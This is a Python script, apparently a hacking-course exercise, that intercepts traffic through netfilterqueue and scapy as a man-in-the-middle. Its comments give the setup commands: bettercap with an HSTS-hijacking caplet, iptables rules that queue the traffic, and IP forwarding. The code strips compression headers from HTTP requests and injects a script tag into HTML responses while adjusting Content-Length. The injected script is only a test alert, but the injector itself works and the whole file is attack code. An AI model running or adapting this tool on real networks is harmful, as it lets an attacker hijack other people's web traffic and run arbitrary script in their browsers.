#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
#bettercap -iface wlan0 -caplet hstshijack/hstshijack
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#echo 1 > /proc/sys/net/ipv4/ip_forward    



def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		try:

			load = scapy_packet[scapy.Raw].load.decode()
			if scapy_packet[scapy.TCP].dport == 8080:
				print('\n[+] Request')
				load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", load)
				load = load.replace("HTTP/1.1", "HTTP/1.0")
				#print(scapy_packet.show())
				
			elif scapy_packet[scapy.TCP].sport == 8080:
				print("[+] Response")
				#print(scapy_packet.show())
				injection_code = "<script>alert('test');</script>"
				load = load.replace("</body>", injection_code + "</body>")
				content_length_result = re.search('(?:Content-Length:\s)(\d*)', load)
				if content_length_result and "text/html" in load:
					content_length = content_length_result.group(1)
					new_content_length = int(content_length) + len(injection_code)
					load = load.replace(content_length, str(new_content_length))
					
			if load != scapy_packet[scapy.Raw].load:
				new_packet = set_load(scapy_packet, load)
				packet.set_payload(bytes(new_packet))
		except UnicodeDecodeError:
			pass
	packet.accept()
queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] User requested program termination...")
    queue.unbind()
